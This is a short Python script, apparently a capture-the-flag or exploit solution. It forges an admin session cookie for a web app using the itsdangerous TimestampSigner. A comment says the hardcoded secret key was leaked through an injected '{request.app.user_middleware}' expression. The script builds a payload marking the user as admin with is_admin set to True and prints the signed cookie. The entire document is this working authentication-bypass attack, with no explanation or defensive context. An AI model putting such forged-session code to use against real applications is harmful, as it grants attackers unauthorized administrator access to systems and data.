import itsdangerous
import json
from base64 import b64encode

def create_session_cookie(secret_key, session_data):
    signer = itsdangerous.TimestampSigner(str(secret_key))
    data = b64encode(json.dumps(session_data).encode("utf-8"))
    signed_data = signer.sign(data)
    return signed_data.decode("utf-8")

# leak via {request.app.user_middleware}
secret_key = 'c1709f5a217a83840bc818c440bddafbfbb14e678f12298a144a43512714479c'
session_data = {
    "user": {"id": "admin_id", "username": "admin"},
    "is_admin": True  
}

cookie_value = create_session_cookie(secret_key, session_data)
print(f"session={cookie_value}")
